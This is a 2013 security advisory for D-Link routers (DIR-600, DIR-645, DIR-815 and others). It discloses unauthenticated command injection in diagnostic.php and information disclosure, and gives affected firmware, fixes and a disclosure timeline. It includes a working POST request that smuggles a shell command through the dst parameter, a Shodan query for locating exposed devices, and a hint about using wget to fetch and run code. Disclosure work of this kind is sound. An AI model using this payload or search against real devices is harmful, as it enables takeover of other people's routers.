@@ -1,0 +1,124 @@
+# Exploit Title: Multiple Vulnerabilities in Dlink devices
+# Date: 05.04.2013
+# Exploit Author: m-1-k-3
+# Vendor Homepage: http://www.dlink.de
+# Software Link: http://www.dlink.de/cs/Satellite?c=Product_C&childpagename=DLinkEurope-DE%2FDLProductCarouselSingle&cid=1197391383981&p=1197318958269&packedargs=ProductParentID%3D1197318677527%26category%3DQuickProductFinder%26locale%3D1195806663795%26term%3DDIR-645&pagename=DLinkEurope-DE%2FDLWrapper
+# Version: different devices and versions are affected
+
+Device Name: DIR-600 / DIR-300 revB / DIR-815 / DIR-645 / DIR-412 / DIR-456 / DIR-110
+Vendor: D-Link
+
+============  Vulnerable Firmware Releases: ============ 
+
+DIR-815 v1.03b02 (unauthenticated command injection)
+DIR-645 v1.02 (unauthenticated command injection)
+DIR-645 v1.03 (authenticated command injection)
+DIR-600 below v2.16b01 (with v2.16b01 D-Link also fixes different vulnerabilities reported in M1ADV2013-003)
+DIR-300 revB v2.13b01 (unauthenticated command injection)
+DIR-300 revB v2.14b01 (authenticated command injection)
+DIR-412 Ver 1.14WWB02 (unauthenticated command injection)
+DIR-456U Ver 1.00ONG (unauthenticated command injection)
+DIR-110 Ver 1.01 (unauthenticated command injection)
+
+Possible other versions and devices are also affected by this vulnerability.
+
+============ Shodan Torks ============ 
+
+Shodan search: Server: Linux, HTTP/1.1, DIR
+	=> 9300 results
+	
+============ Vulnerability Overview: ============ 
+
+* OS Command Injection
+
+The vulnerability is caused by missing input validation in the dst parameter and missing session validation and can be exploited to inject and execute arbitrary shell commands.
+
+WARNING: You do not need to be authenticated to the device to insert and execute malicious commands.
+Hint: On different devices like the DIR-645 wget is preinstalled and you are able to upload and execute your malicious code.
+
+	=> Parameter: dst
+
+Example Exploit:
+POST /diagnostic.php HTTP/1.1
+Host: xxxx
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 Firefox/16.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Proxy-Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Referer: http://xxxx/
+Content-Length: 41
+Cookie: uid=hfaiGzkB4z
+Pragma: no-cache
+Cache-Control: no-cache
+
+act=ping&dst=%26%20COMMAND%26
+
+Screenshot: http://www.s3cur1ty.de/sites/www.s3cur1ty.de/files/images/05.04.2013%20-%20Dlink-DIR-645_msf-shell.txt.png
+
+* Information disclosure:
+
+Nice server banner to detect this type of devices easily:
+
+Server Banner: Server: Linux, HTTP/1.1, DIR-815
+Server Banner: Server: Linux, HTTP/1.1, DIR-645
+Server Banner: Server: Linux, HTTP/1.1, DIR-600
+Server Banner: Server: Linux, HTTP/1.1, DIR-300
+Server Banner: Server: Linux, HTTP/1.1, DIR-412
+Server Banner: Server: Linux, HTTP/1.1, DIR-456U
+Server Banner: Server: Linux, HTTP/1.1, DIR-110
+
+* Information Disclosure:
+
+Detailed device information including Model Name, Hardware Version, Linux Kernel, Firmware version, Language and MAC Addresses are available via the network.
+
+Request:
+http://<IP>IP/DevInfo.txt or http://<IP>IP/version.txt (check the source of the site)
+
+Response to DevInfo.txt:
+
+Firmware External Version: V1.00
+Firmware Internal Version: a86b
+Model Name: DIR-815
+Hardware Version: 
+WLAN Domain: xxx
+Kernel: 2.6.33.2
+Language: en
+Graphcal Authentication: Disable
+LAN MAC: xx
+WAN MAC: xx
+WLAN MAC: xx
+
+These details are available without authentication.
+
+============ Solution ============
+
+DIR-645: Update to firmware v1.04b5
+DIR-600: Update to firmware v2.16B01
+DIR-300rev B: Update to firmware 2.14B01 fixes the authentication bypass but not the command injection vulnerability.
+Other devices: No known solution available.
+
+============ Credits ============
+
+The vulnerability was discovered by Michael Messner
+Mail: devnull#at#s3cur1ty#dot#de
+Web: http://www.s3cur1ty.de/advisories
+Twitter: @s3cur1ty_de
+
+============ Time Line: ============
+
+14.12.2012 - discovered vulnerability in first device
+14.12.2012 - contacted dlink via the webinterface http://www.dlink.com/us/en/home-solutions/contact-d-link
+20.12.2012 - contacted Heise Security with details and Heisec forwarded the details to D-Link
+21.12.2012 - D-link responded that they will check the findings
+11.01.2013 - requested status update
+25.01.2013 - requested status update and updated D-Link with the other vulnerable devices
+25.01.2013 - D-Link responded that this is a security problem from the user and/or browser and they will not provide a fix.
+07.02.2013 - after the DIR-600/300 drama D'Link contacted me and now they are talking with me ;)
+since 07.02.2013 - Good communication and firmware testing
+27.02.2013 - Roberto Paleari releases details about authentication bypass in DIR-645 - http://packetstormsecurity.com/files/120591/dlinkdir645-bypass.txt
+05.04.2013 - vendor releases firmware updates
+05.04.2013 - public release
+
+===================== Advisory end =====================
